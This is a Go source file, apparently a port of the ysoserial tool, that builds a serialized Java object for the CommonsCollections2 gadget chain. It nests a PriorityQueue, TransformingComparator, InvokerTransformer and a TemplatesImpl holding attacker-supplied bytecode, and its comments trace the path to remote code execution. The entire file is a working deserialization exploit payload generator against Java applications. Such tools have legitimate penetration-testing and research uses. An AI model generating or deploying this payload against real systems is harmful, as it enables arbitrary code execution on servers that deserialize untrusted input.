package ysoserial

func CommonsCollections2(bytecodes []byte) []byte {
	return ClassObject{ // readObject() -> heapify() -> siftDown() -> siftDownUsingComparator() ->
		name:             "java.util.PriorityQueue",
		serialVersionUID: -7720805057305804111,
		classDescFlags:   SC_WRITE_METHOD | SC_SERIALIZABLE,
		fields: []Field{
			{Integer, "size", 2},
			{"Ljava/util/Comparator;", "comparator", ClassObject{ // compare() ->
				name:             "org.apache.commons.collections4.comparators.TransformingComparator",
				serialVersionUID: 3456940356043606220,
				classDescFlags:   SC_SERIALIZABLE,
				fields: []Field{
					{"Ljava/util/Comparator;", "decorated", ClassObject{
						name:              "org.apache.commons.collections4.comparators.ComparableComparator",
						serialVersionUID:  -291439688585137865,
						classDescFlags:    SC_SERIALIZABLE,
						fields:            []Field{},
						classAnnotations:  interfaces(),
						super:             nil,
						objectAnnotations: interfaces(),
					},
					},
					{"Lorg/apache/commons/collections4/Transformer;", "transformer", ClassObject{ // transform()
						name:             "org.apache.commons.collections4.functors.InvokerTransformer",
						serialVersionUID: -8653385846894047688,
						classDescFlags:   SC_SERIALIZABLE,
						fields: []Field{
							{"[Ljava/lang/Object;", "iArgs", ArrayObject{
								name:             "[Ljava.lang.Object;",
								serialVersionUID: -8012369246846506644,
								classDescFlags:   SC_SERIALIZABLE,
								values:           interfaces(),
								annotations:      interfaces(),
							},
							},
							{"Ljava/lang/String;", "iMethodName", "newTransformer"},
							{"[Ljava/lang/Class;", "iParamTypes", ArrayObject{
								name:             "[Ljava.lang.Class;",
								serialVersionUID: -6118465897992725863,
								classDescFlags:   SC_SERIALIZABLE,
								values:           interfaces(),
								annotations:      interfaces(),
							},
							},
						},
						classAnnotations:  interfaces(),
						super:             nil,
						objectAnnotations: interfaces(),
					},
					},
				},
				classAnnotations:  interfaces(),
				super:             nil,
				objectAnnotations: interfaces(),
			},
			},
		},
		classAnnotations: interfaces(),
		super:            nil,
		objectAnnotations: interfaces(
			blockData{0x00, 0x00, 0x00, 0x03},
			ClassObject{ // newTransformer() -> getTransletInstance() -> newInstance() -> RCE
				name:             "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
				serialVersionUID: 673094361519270707,
				classDescFlags:   SC_WRITE_METHOD | SC_SERIALIZABLE,
				fields: []Field{
					{Integer, "_indentNumber", 0},
					{Integer, "_transletIndex", -1},
					{Boolean, "_useServicesMechanism", false},
					{"Lcom/sun/org/apache/xalan/internal/xsltc/runtime/Hashtable;", "_auxClasses", nil},
					{"[[B", "_bytecodes", ArrayObject{
						name:             "[[B",
						serialVersionUID: 5475560301672258359,
						classDescFlags:   SC_SERIALIZABLE,
						values: interfaces(
							ArrayObject{
								name:             "[B",
								serialVersionUID: -5984413125824719648,
								classDescFlags:   SC_SERIALIZABLE,
								values:           bytesToInterfaces(bytecodes),
								annotations:      interfaces(),
							}, ArrayObject{
								name:             "[B",
								serialVersionUID: -5984413125824719648,
								classDescFlags:   SC_SERIALIZABLE,
								values: interfaces(
									byte(0xca), byte(0xfe), byte(0xba), byte(0xbe), byte(0x00), byte(0x00), byte(0x00), byte(0x32), byte(0x00), byte(0x1b), byte(0x0a), byte(0x00), byte(0x03), byte(0x00), byte(0x15), byte(0x07), byte(0x00), byte(0x17), byte(0x07), byte(0x00), byte(0x18), byte(0x07), byte(0x00), byte(0x19), byte(0x01), byte(0x00), byte(0x10), byte(0x73), byte(0x65), byte(0x72), byte(0x69), byte(0x61), byte(0x6c), byte(0x56), byte(0x65), byte(0x72), byte(0x73), byte(0x69), byte(0x6f), byte(0x6e), byte(0x55), byte(0x49), byte(0x44), byte(0x01), byte(0x00), byte(0x01), byte(0x4a), byte(0x01), byte(0x00), byte(0x0d), byte(0x43), byte(0x6f), byte(0x6e), byte(0x73), byte(0x74), byte(0x61), byte(0x6e), byte(0x74), byte(0x56), byte(0x61), byte(0x6c), byte(0x75), byte(0x65), byte(0x05), byte(0x71), byte(0xe6), byte(0x69), byte(0xee), byte(0x3c), byte(0x6d), byte(0x47), byte(0x18), byte(0x01), byte(0x00), byte(0x06), byte(0x3c), byte(0x69), byte(0x6e), byte(0x69), byte(0x74), byte(0x3e), byte(0x01), byte(0x00), byte(0x03), byte(0x28), byte(0x29), byte(0x56), byte(0x01), byte(0x00), byte(0x04), byte(0x43), byte(0x6f), byte(0x64), byte(0x65), byte(0x01), byte(0x00), byte(0x0f), byte(0x4c), byte(0x69), byte(0x6e), byte(0x65), byte(0x4e), byte(0x75), byte(0x6d), byte(0x62), byte(0x65), byte(0x72), byte(0x54), byte(0x61), byte(0x62), byte(0x6c), byte(0x65), byte(0x01), byte(0x00), byte(0x12), byte(0x4c), byte(0x6f), byte(0x63), byte(0x61), byte(0x6c), byte(0x56), byte(0x61), byte(0x72), byte(0x69), byte(0x61), byte(0x62), byte(0x6c), byte(0x65), byte(0x54), byte(0x61), byte(0x62), byte(0x6c), byte(0x65), byte(0x01), byte(0x00), byte(0x04), byte(0x74), byte(0x68), byte(0x69), byte(0x73), byte(0x01), byte(0x00), byte(0x03), byte(0x46), byte(0x6f), byte(0x6f), byte(0x01), byte(0x00), byte(0x0c), byte(0x49), byte(0x6e), byte(0x6e), byte(0x65), byte(0x72), byte(0x43), byte(0x6c), byte(0x61), byte(0x73), byte(0x73), byte(0x65), byte(0x73), byte(0x01), byte(0x00), byte(0x25), byte(0x4c), byte(0x79), byte(0x73), byte(0x6f), byte(0x73), byte(0x65), byte(0x72), byte(0x69), byte(0x61), byte(0x6c), byte(0x2f), byte(0x70), byte(0x61), byte(0x79), byte(0x6c), byte(0x6f), byte(0x61), byte(0x64), byte(0x73), byte(0x2f), byte(0x75), byte(0x74), byte(0x69), byte(0x6c), byte(0x2f), byte(0x47), byte(0x61), byte(0x64), byte(0x67), byte(0x65), byte(0x74), byte(0x73), byte(0x24), byte(0x46), byte(0x6f), byte(0x6f), byte(0x3b), byte(0x01), byte(0x00), byte(0x0a), byte(0x53), byte(0x6f), byte(0x75), byte(0x72), byte(0x63), byte(0x65), byte(0x46), byte(0x69), byte(0x6c), byte(0x65), byte(0x01), byte(0x00), byte(0x0c), byte(0x47), byte(0x61), byte(0x64), byte(0x67), byte(0x65), byte(0x74), byte(0x73), byte(0x2e), byte(0x6a), byte(0x61), byte(0x76), byte(0x61), byte(0x0c), byte(0x00), byte(0x0a), byte(0x00), byte(0x0b), byte(0x07), byte(0x00), byte(0x1a), byte(0x01), byte(0x00), byte(0x23), byte(0x79), byte(0x73), byte(0x6f), byte(0x73), byte(0x65), byte(0x72), byte(0x69), byte(0x61), byte(0x6c), byte(0x2f), byte(0x70), byte(0x61), byte(0x79), byte(0x6c), byte(0x6f), byte(0x61), byte(0x64), byte(0x73), byte(0x2f), byte(0x75), byte(0x74), byte(0x69), byte(0x6c), byte(0x2f), byte(0x47), byte(0x61), byte(0x64), byte(0x67), byte(0x65), byte(0x74), byte(0x73), byte(0x24), byte(0x46), byte(0x6f), byte(0x6f), byte(0x01), byte(0x00), byte(0x10), byte(0x6a), byte(0x61), byte(0x76), byte(0x61), byte(0x2f), byte(0x6c), byte(0x61), byte(0x6e), byte(0x67), byte(0x2f), byte(0x4f), byte(0x62), byte(0x6a), byte(0x65), byte(0x63), byte(0x74), byte(0x01), byte(0x00), byte(0x14), byte(0x6a), byte(0x61), byte(0x76), byte(0x61), byte(0x2f), byte(0x69), byte(0x6f), byte(0x2f), byte(0x53), byte(0x65), byte(0x72), byte(0x69), byte(0x61), byte(0x6c), byte(0x69), byte(0x7a), byte(0x61), byte(0x62), byte(0x6c), byte(0x65), byte(0x01), byte(0x00), byte(0x1f), byte(0x79), byte(0x73), byte(0x6f), byte(0x73), byte(0x65), byte(0x72), byte(0x69), byte(0x61), byte(0x6c), byte(0x2f), byte(0x70), byte(0x61), byte(0x79), byte(0x6c), byte(0x6f), byte(0x61), byte(0x64), byte(0x73), byte(0x2f), byte(0x75), byte(0x74), byte(0x69), byte(0x6c), byte(0x2f), byte(0x47), byte(0x61), byte(0x64), byte(0x67), byte(0x65), byte(0x74), byte(0x73), byte(0x00), byte(0x21), byte(0x00), byte(0x02), byte(0x00), byte(0x03), byte(0x00), byte(0x01), byte(0x00), byte(0x04), byte(0x00), byte(0x01), byte(0x00), byte(0x1a), byte(0x00), byte(0x05), byte(0x00), byte(0x06), byte(0x00), byte(0x01), byte(0x00), byte(0x07), byte(0x00), byte(0x00), byte(0x00), byte(0x02), byte(0x00), byte(0x08), byte(0x00), byte(0x01), byte(0x00), byte(0x01), byte(0x00), byte(0x0a), byte(0x00), byte(0x0b), byte(0x00), byte(0x01), byte(0x00), byte(0x0c), byte(0x00), byte(0x00), byte(0x00), byte(0x2f), byte(0x00), byte(0x01), byte(0x00), byte(0x01), byte(0x00), byte(0x00), byte(0x00), byte(0x05), byte(0x2a), byte(0xb7), byte(0x00), byte(0x01), byte(0xb1), byte(0x00), byte(0x00), byte(0x00), byte(0x02), byte(0x00), byte(0x0d), byte(0x00), byte(0x00), byte(0x00), byte(0x06), byte(0x00), byte(0x01), byte(0x00), byte(0x00), byte(0x00), byte(0x2e), byte(0x00), byte(0x0e), byte(0x00), byte(0x00), byte(0x00), byte(0x0c), byte(0x00), byte(0x01), byte(0x00), byte(0x00), byte(0x00), byte(0x05), byte(0x00), byte(0x0f), byte(0x00), byte(0x12), byte(0x00), byte(0x00), byte(0x00), byte(0x02), byte(0x00), byte(0x13), byte(0x00), byte(0x00), byte(0x00), byte(0x02), byte(0x00), byte(0x14), byte(0x00), byte(0x11), byte(0x00), byte(0x00), byte(0x00), byte(0x0a), byte(0x00), byte(0x01), byte(0x00), byte(0x02), byte(0x00), byte(0x16), byte(0x00), byte(0x10), byte(0x00), byte(0x09),
								),
								annotations: interfaces(),
							},
						),
						annotations: interfaces(),
					},
					},
					{"[Ljava/lang/Class;", "_class", nil},
					{"Ljava/lang/String;", "_name", "Pwnr"},
					{"Ljava/util/Properties;", "_outputProperties", nil},
				},
				classAnnotations: interfaces(),
				super:            nil,
				objectAnnotations: interfaces(
					blockData{0x00},
				),
			},

			ClassObject{
				name:             "java.lang.Integer",
				serialVersionUID: 1360826667806852920,
				classDescFlags:   SC_SERIALIZABLE,
				fields: []Field{
					{Integer, "value", 1},
				},
				classAnnotations: interfaces(),
				super: &ClassObject{
					name:              "java.lang.Number",
					serialVersionUID:  -8742448824652078965,
					classDescFlags:    SC_SERIALIZABLE,
					fields:            []Field{},
					classAnnotations:  interfaces(),
					super:             nil,
					objectAnnotations: interfaces(),
				},
				objectAnnotations: interfaces(),
			},
		),
	}.SerializeWithMagicHeader()
}
